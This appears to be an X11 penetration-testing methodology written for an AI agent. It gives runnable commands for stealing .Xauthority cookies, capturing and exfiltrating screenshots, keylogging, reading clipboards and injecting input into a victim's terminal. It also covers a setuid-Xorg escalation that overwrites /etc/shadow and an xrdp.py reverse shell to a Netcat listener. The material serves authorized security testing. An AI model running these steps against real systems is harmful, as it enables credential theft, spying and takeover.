---
technology: "X Window System (X11)"
kind: bug-bounty-methodology
audience: ai-agent
version: 1.0
family: desktop
status: thin
evidence: "2 writeups (see ../internal coverage ledger) — thin unit, upstream-weighted by design"
provenance: "corpus-mined from 2 writeups in the writeup corpus + upstream-verified: X.Org advisory 2018-10-25 (CVE-2018-14665: xorg-server 1.19.0–1.20.2, -modulepath/-logfile, fixed 1.20.3, setuid precondition), xauth(1)/xwd(1)/xdpyinfo(1) man pages, XDMCP spec behavior. Pass 2 wave C, 2026-11-12. Phase 6 additions: rewritten from HackTricks (hacktricks/src/network-services-pentesting/6000-pentesting-x11.md), CC BY-NC 4.0, accessed 2026-11-13 — x11-access NSE, open_x11/x11_keyboard_exec modules, xrdp.py/xwatchwin/xpra viewing, XSendEvent caveat, NFS AUTH_SYS nuance verified against nmap/metasploit repos, the archived Infosec Institute walkthrough, and the xpra README."
---

Companion page: [[x11|X11 overview]] — the display/cookie trust model and where X sessions live. Tool reference notes live in the separate tools vault; Appendix A names the relevant tools in prose.

# X11 Bug Bounty Methodology

Goal: from any foothold (or pure recon), determine whether a live X session exists, steal or abuse its authentication, and convert that into screen content, keystrokes, and privilege — plus the setuid-Xorg escalation path on legacy hosts. X11 attacks are almost entirely post-foothold or same-subnet; they begin the moment you can execute commands on the host or reach its display ports.

## Phase 1 — Enumerate displays (recon)

On-host (any shell):

```
w                                  # FROM column: who is on :0 / display numbers
ps aux | grep -iE 'Xorg|X11'       # server processes, -auth arguments, display numbers
ls -la /tmp/.X11-unix/             # one socket per live display (X0, X1, ...)
ls -la /home/*/.Xauthority         # cookie files in every home (note owners + modes)
echo $DISPLAY $XAUTHORITY          # your current context (often empty on shells)
```

Off-host (network):

```
nmap -sU -p 177 <target>           # XDMCP (display manager query)
nmap -p 6000-6063 <target>         # network X servers (display N = port 6000+N)
xdpyinfo -display 198.51.100.10:0  # answers without auth on xhost+ hosts — free recon
```

Decision: live local display (`/tmp/.X11-unix/X0` + a user in `w`'s FROM on `:0`) → Phase 2. Network-exposed 6000/tcp → try direct connection before cookie theft. UDP/177 open → Phase 5.

## Phase 2 — Steal the session cookie

Any of these gets you the credential file:

- **Read primitives**: LFI/file-read for `/home/<user>/.Xauthority` (and root's — the display owner's file, not root's, is what authenticates; root's matters if root owns the console session).
- **NFS-exported homes**: mount the export, read the file directly (`cat /mnt/export/.Xauthority | base64`), decode on your side (`echo <b64> | base64 -d > /tmp/.Xauthority`). Real usage moved the cookie exactly this way from an exported home directory.
- **Backups / dotfile archives / dropped copies** (`.Xauthority.bak`, home tars).
- **Wrong-permission files**: `.Xauthority` should be 0600; group/world-readable instances are themselves a finding.

Merge or point:

```
export XAUTHORITY=/tmp/.Xauthority   # point at your copy
export DISPLAY=:0                    # the display you identified in Phase 1
xdpyinfo                             # CONNECTION TEST: no error = you are the session
# alternative: merge into your own authority
xauth add <host>:0 . <hexkey>        # key from: xauth -f /tmp/.Xauthority list
```

If `xdpyinfo` fails with `Invalid MIT-MAGIC-COOKIE-1`, the cookie is stale (session restarted) — re-steal; if it fails with connection refused, wrong display number — re-run `w`.

## Phase 3 — Harvest through the session

You are now a trusted X client. Impact in descending value:

```
# Screen capture (what is on their screen right now — root terminals included)
xwd -root -screen -silent -display :0 > /tmp/screen.xwd
convert /tmp/screen.xwd /tmp/screen.png        # ImageMagick; exfil the png
# window-by-window: xwininfo -root -tree first, then xwd -id <windowid>

# Keystroke capture (typed passwords land in your log)
xspy -display :0                               # classic X keylogger, dumps to stdout
xinput test-xi2 --display :0                   # event stream incl. RawKeyRelease (XI2)
# record/inject via XRecord/XTest-based tooling (xdotool for injection)

# Clipboard (recently copied credentials)
xclip -o -selection clipboard                  # also -selection primary
xsel -ob / xsel -op

# Input injection (type as the user — into their terminal if you dare)
xdotool type --window <windowid> "command"
xdotool key Return
```

Report framing: screen capture of an administrator session is usually full compromise — the capture includes their open root terminal, browser sessions, and any on-screen secrets. Capture FIRST (evidence), keylog second (persistence), inject last (most intrusive).

## Phase 4 — Privilege escalation via privileged Xorg (CVE-2018-14665)

Preconditions: Xorg setuid root (or `Xorg.wrap` setuid) AND unprivileged console access (physical or serial-console-equivalent, or an exploit path that can start X).

```
ls -l /usr/bin/Xorg /usr/lib/xorg/Xorg.wrap            # look for the setuid bit
Xorg -version                                           # gate: 1.19.0 <= v < 1.20.3
```

Two escalation forms (upstream advisory, October 2018):

- **`-modulepath`**: start the server with a module path you control; a loaded module executes inside the privileged server process.
- **`-logfile`**: overwrite an arbitrary file with log content you partially control (font-path strings via `-fp` are logged); the classic target is `/etc/shadow` with an injected, hash-bearing line, then `su` with the matching password.

Public exploit code exists for both; the version gate is hard (fixed in 1.20.3). If the bit is absent, stop — the CVE does not apply.

## Phase 5 — XDMCP (UDP/177)

```
# ask the display manager for a session (nets its own display on your side)
X -query 198.51.100.10 :1           # full login screen of the remote host, locally
Xnest -query 198.51.100.10 :1       # nested variant
# discovery: broadcast query answers enumerate every willing host on the segment
```

- A manager answering queries hands you a **login interface to the target** — attack credentials there (the login path bypasses nothing, but sessions you start are yours; some appliances had no further auth).
- Report unauthenticated XDMCP on any boundary-facing host: it is a desktop-login oracle and reconnaissance feed at minimum.

## Phase 6 — Remote-access tooling and follow-ups (upstream additions, 2026-11-13)

Unauthenticated-access check before any cookie work: nmap's `x11-access` NSE script
(`nmap -sV --script x11-access -p 6000 <target>`) and metasploit's
`auxiliary/scanner/x11/open_x11` both answer the one question that gates Phases 2-3 —
can a client connect with no cookie at all (the `xhost +` state)? A yes routes straight
to Phase 3 tooling with `DISPLAY=<target>:0`.

Viewing and driving the display from your host (cookie or open access in hand):

- **Live view of a single window**: `xwininfo -root -tree -display <target>:0` gives the
  window IDs; xwatchwin attaches live to one ID — the classic pair for watching a
  specific application (an admin terminal) rather than grabbing frames.
- **Whole-desktop live view / R-shell**: the xrdp.py proof-of-concept from the archived
  Infosec Institute walkthrough renders the remote `:0` interactively; run with
  `--no-disp` its **R-Shell** menu option turns the same access into a reverse shell
  connecting back to a Netcat listener (5555 in the original).
- **Maintained alternative**: xpra shadows an existing desktop session (`xpra shadow
  ssh://user@host/`) — a current, supported way to get the xwatchwin effect.
- **Keystroke injection caveat**: `xdotool type --window <id>` delivers events via
  XSendEvent and many applications silently ignore them; `windowactivate --sync` on the
  target window followed by plain `type`/`key` is the reliable order. Metasploit's
  `exploit/unix/x11/x11_keyboard_exec` automates the keyboard-injection-to-execution
  step against an accessible display.

Post-connection enumeration (beyond Phase 3): xlsclients lists every other client
attached to the display (who is doing what), `xprop -root _NET_ACTIVE_WINDOW` names the
currently focused window, and `xinput --list` inventories input devices.

Two reachability notes worth carrying into reports:

- **NFS AUTH_SYS and the cookie**: on an NFS-exported home the server enforces only the
  numeric UID/GID the client asserts; `root_squash` remaps UID 0 but protects no other
  UID, so any client permitted on the export can present the victim's UID and read
  `.Xauthority` regardless of its on-host permissions. A readable cookie is a lead, not
  access — it must match a live, reachable display.
- **Internet-facing X**: Shodan `port:6000 x11` surfaces network-reachable displays;
  every hit is an x11-access check away from full GUI compromise.

## Decision points

| Situation | Action |
|---|---|
| Cookie read + `w` shows `:0` user | replay cookie, `xwd` screenshot immediately |
| `xhost +` / no-auth network X (6000/tcp) | connect directly from your host; screen/keylog without any cookie |
| Cookie stale | session restarted; re-read `.Xauthority` (mtime tells you when) |
| ssh `-X` forwarding present on a jump host | stolen cookies on the jump host compose with forwarding to reach interior displays |
| Setuid Xorg, version 1.19.0–1.20.2, console access | CVE-2018-14665 modulepath/logfile privesc |
| UDP/177 open | XDMCP query; enumerate + login oracle |

## Appendix A — Tools (prose)

- **xauth** — inspect, merge, and add `.Xauthority` cookies (`list`, `add`, `-f` for alternate files).
- **w / ps / xwininfo** — display enumeration and window-tree mapping (xwininfo for per-window capture targets).
- **xwd** — the X window/framebuffer dumper (`-root` full screen, `-id` per window, `-display` target); pair with ImageMagick's `convert` for PNG output.
- **xdpyinfo** — connection/auth test oracle; also fingerprints the server.
- **xspy** — the classic X keystroke logger for a connected display.
- **xinput** (XI2 `test-xi2`) — raw event capture including keys, no extra keylogger binary needed.
- **xdotool** — XTest-based input injection and window management (type, key, window focus).
- **xclip / xsel** — clipboard read-back (primary + clipboard selections).
- **Xnest / X -query** — XDMCP session clients for Phase 5.
